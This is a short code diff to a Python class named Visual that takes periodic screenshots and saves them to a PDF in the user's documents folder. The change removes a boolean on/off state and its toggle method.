@@ -7,12 +7,7 @@ import pyscreenshot as ImageGrab
 
 class Visual:
     def __init__(self, screenshot_period):
-        self.screenshot_state = True
         self.screenshot_period = screenshot_period
-
-    def change_state(self):
-        self.screenshot_state = not self.screenshot_state
-
 
     def make_pdf(self):
         user_path = os.path.expanduser('~\\documents')
